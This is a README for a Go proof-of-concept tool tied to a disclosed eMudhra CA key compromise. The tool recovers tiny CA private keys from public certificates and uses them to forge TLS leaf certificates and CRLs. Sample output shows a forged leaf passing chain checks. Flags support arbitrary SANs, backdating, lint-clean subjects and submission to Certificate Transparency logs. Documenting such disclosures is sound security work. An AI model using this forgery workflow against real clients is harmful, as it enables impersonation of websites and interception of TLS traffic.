# emudhra-poc

Proof of concept for the eMudhra emSign ECC G3 intermediate key compromise
([Mozilla bug 2083449](https://bugzilla.mozilla.org/show_bug.cgi?id=2083449)).
The CA private keys are tiny integers, so they can be recovered from the
public CA certificates and used to sign arbitrary leaf certificates.
All affected intermediates are revoked (caCompromise).

The tool recovers the CA key from the CA certificate, issues a leaf
certificate (max. 398 days validity) and verifies the result.

```
$ ./emudhra-poc
Issuing CA
  Subject:        CN=EM DV TLS CA - G3B,O=eMudhra BV,C=NL
  Issuer:         CN=AAA Certificate Services,O=Comodo CA Limited,L=Salford,ST=Greater Manchester,C=GB
  Serial:         a024fdf4ba665c785ce4a020483858b7
  Not before:     2025-05-14T00:00:00Z
  Not after:      2028-12-31T23:59:59Z
  Public key:     ECDSA P-384
  Signature alg:  SHA256-RSA
  CA:             true
  Key usage:      keyCertSign, cRLSign
  Ext key usage:  serverAuth, clientAuth
  Policy:         2.23.140.1.2.1
  Policy:         1.3.6.1.4.1.50977.1.0.1
  Policy:         1.3.6.1.4.1.50977.1.2.100
  Subject key ID: e21e2fe71c19390e554b62c120245735248a2514
  Auth key ID:    a0110a233e96f107ece2af29ef82a57fd030a4b4
  CRL:            http://crl.comodoca.com/AAACertificateServices.crl
  OCSP:           http://ocsp.comodoca.com
  SHA-256:        45A883F349AEDFD5F3A649B5498FFB121712BA8B448F3F2A91DBC5A766FCDDBE
  Recovered key:  d = 156

Leaf certificate
  Subject:        CN=we-are-lost.com,O=eMudhra key lol
  Issuer:         CN=EM DV TLS CA - G3B,O=eMudhra BV,C=NL
  Serial:         0b43fde43400886738a0db939171bb9a
  Not before:     2026-10-21T00:20:19Z
  Not after:      2026-10-22T00:25:19Z
  Public key:     ECDSA P-256
  Signature alg:  ECDSA-SHA384
  CA:             false
  Key usage:      digitalSignature
  Ext key usage:  serverAuth
  SANs:           DNS:we-are-lost.com
  Auth key ID:    e21e2fe71c19390e554b62c120245735248a2514
  SHA-256:        E14B628A75FCAEFF583CDEC1B61D9D075CDBDCDD5449E1AAAF571A18750D2170

Checks
  [ OK ] leaf signature verifies under CA public key
  [ OK ] leaf certificate matches generated leaf key
  [ OK ] leaf authority key ID matches CA subject key ID
  [ OK ] chain verification against CA certificate (intermediate used as trust anchor, offline)
         chain: we-are-lost.com -> EM DV TLS CA - G3B
  [INFO] Go x509.Verify accepts the chain

Output
  cert:  out/leaf.pem
  key:   out/leaf.key
  chain: out/chain.pem

Note: the issuing CA was revoked with reason caCompromise; revocation-checking clients should reject this chain.
```

The `[INFO]` line is informational: Go 1.26.10 / 1.27.3 and later distrust the
compromised eMudhra keys in `x509.Verify` and print `[INFO] Go x509.Verify
rejects the chain: x509: no valid chains built`. The tool verifies the chain
itself, so the checks pass with any Go version.

## Usage

```
go build -o emudhra-poc ./src
cp config.example.json config.json   # set ca_cert to one of the CA PEMs
./emudhra-poc                        # issue, write files, print details and checks
```

| Flag          | Description                                                     |
|---------------|-----------------------------------------------------------------|
| `-config`     | Path to the JSON config (default `config.json`)                 |
| `-san`        | SANs, repeatable or comma-separated; replaces config SANs       |
| `-show`       | Print only the certificate PEM; no files, no checks             |
| `-chain`      | Also print the complete chain (leaf, CA, root) as PEM           |
| `-json`       | Print only the chain as a CT `add-chain` JSON request           |
| `-ct-log`     | CT log URL, repeatable or comma-separated; embeds SCTs; replaces `ct_logs` |
| `-out-dir`    | Also write `<serial>.crt`, `.key` and `.crt_pre` here; overrides `output.dir` |
| `-not-before` | Backdate the leaf (Unix timestamp or UTC datetime); overrides `leaf.not_before` |
| `-crl`        | Sign a CRL from the `crl` config with the recovered key, then exit |
| `-crl-out`    | Write the signed CRL PEM here; overrides `crl.output`           |
| `-revocation` | Also check the issuing CA against the cached CRL and OneCRL     |
| `-update-revocation` | Refresh the revocation cache, then exit                  |
| `-keys`, `-roots`, `-revocation-dir` | Directories (default `keys`, `roots`, `revocation`) |

SAN types are inferred or set with a prefix: `DNS:`, `IP:`, `email:`, `URI:`.

## Certificate Transparency

With `ct_logs` (or `-ct-log`), the leaf is first issued as a precertificate
(same serial and contents plus the critical poison extension), which is sent
to each log's `/ct/v1/add-pre-chain` together with the CA and, if configured,
`root_cert`. The returned SCTs are embedded in the final certificate, which
is then signed again. Logs that reject the precertificate are reported and
skipped; at least one SCT is required.

The final certificate (with the embedded SCTs) is then submitted to every
log's `/ct/v1/add-chain` as well, also with `-show`. A log that rejects it is
only reported, since the certificate already carries the precertificate SCTs.

Every returned SCT is saved (TLS-encoded, RFC 6962 3.2, as used by
`ssl_ct_static_scts`-style servers) to `output.dir`, or to the directory of
`output.cert` without it. `<log>` is the first 8 bytes of the log ID in hex:

- `<serial>.<log>.pre.sct`: SCT for the precertificate (embedded)
- `<serial>.<log>.sct`: SCT for the final certificate

```json
"ct_logs": [
  {"url": "https://ct.example/2026h2/", "key": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE..."}
]
```

`key` is optional: the log's public key as base64 DER, as in the Chrome and
Apple log lists. With a key, the checks verify the log ID and the SCT
signature against the final certificate, for both the embedded SCTs and the
SCTs returned for the final certificate. Chrome and Apple require at least
two SCTs from distinct log operators; with fewer, the checks print a note.

```
./emudhra-poc -ct-log https://ct.example/2026h2/
```

## Output directory

`output.dir` (or `-out-dir`) additionally stores every issued leaf under its
serial number (lowercase hex, as printed in the leaf details):
`<serial>.crt` (certificate), `<serial>.key` (private key) and, with CT logs,
`<serial>.crt_pre` (the precertificate), all PEM, plus the SCT files
described above. With `output.dir` set,
`output.cert` and `output.key` are optional.

```
./emudhra-poc -out-dir issued -ct-log https://ct.example/2026h2/
```

## Backdating

`leaf.not_before` (or `-not-before`) sets the leaf's notBefore to a past
time; notAfter is then notBefore plus `validity_hours`. Accepted formats are a
Unix timestamp in seconds (`1767366245`) or a datetime in UTC
(`2026-01-02T15:04:05Z`, `2026-01-02T15:04:05`, `2026-01-02 15:04:05`,
`2026-01-02`); an RFC 3339 offset such as `+01:00` is converted to UTC. Times
in the future are rejected. If the backdated leaf has already expired, the
chain is verified at its notBefore instead of now.

```
./emudhra-poc -show -not-before 2026-01-02T15:04:05Z
./emudhra-poc -show -not-before 1767366245
```

## Signing CRLs

The compromised key signs CRLs as well as certificates. With `-crl` the tool
recovers the key and signs the CRL described by the `crl` config section, then
exits:

- `number`: CRL number; defaults to `this_update` as a Unix timestamp
- `this_update`: same formats as `-not-before`; defaults to now
- `next_update_hours`: validity of the CRL (default 24)
- `output`: PEM path (or `-crl-out`); the CRL PEM goes to stdout if unset
- `revoked`: entries of `serial` (hex, as printed in the output, with an
  optional `0x` prefix), an optional RFC 5280 `reason` code, and an optional
  `revocation_time` (defaults to `this_update`)

```
./emudhra-poc -crl -crl-out leaf.crl
./emudhra-poc -crl | openssl crl -noout -text
```

An empty `revoked` list produces a valid empty CRL. The CRL is signed by the
revoked CA key, so revocation-checking clients should still reject the chain.

## Lint-clean leaves

The leaf contains only the subject attributes from the config, and inherits
the CA/B Forum policy of the issuing CA. To pass linters such as
[pkilint](https://github.com/digicert/pkilint), match the subject to that
policy:

- DV: only `country` (optional) besides the SANs
- OV: `organization`, `country` and `province` and/or `locality`
- EV: as OV, plus `serial_number`, `business_category` and
  `jurisdiction_country` (`jurisdiction_province`, `jurisdiction_locality`
  optional)

The common name defaults to the first SAN; set `"omit_common_name": true`
to leave it out (not recommended for EV). `organizational_unit` is forbidden
for all of them. Microsoft also requires
revocation information, so set `crl_distribution_points` or `ocsp_server`.

## Revocation

`revocation/` caches the CRLs of the issuing roots (taken from the CRL
distribution points, matching the "Full CRL Issued By This CA" disclosed in
CCADB) and the OneCRL records concerning the certificates in `keys/`. CRLs are
only stored if their signature verifies under a certificate in `roots/`. A
daily workflow refreshes the cache; `-revocation` works offline against it.

```
./emudhra-poc -update-revocation
./emudhra-poc -revocation
```

```
./emudhra-poc -show -san poc.example,IP:192.0.2.1
./emudhra-poc -show -json -san poc.example \
  | curl -sS -H 'Content-Type: application/json' --data-binary @- https://<log>/ct/v1/add-chain
```

## Layout

All Go code lives in `src/` (package `main`); `go.mod`, the example config
and the CA certificates in `keys/` stay in the repository root.

```
go test ./...
```

## References

- [CERTIFICATES.md](CERTIFICATES.md): all 16 affected certificates

- https://github.com/Fluepke/emudrahahahahaha
- https://github.com/galadran/we-have-a-problem.com
- https://emudhra.we-have-a-problem.com/
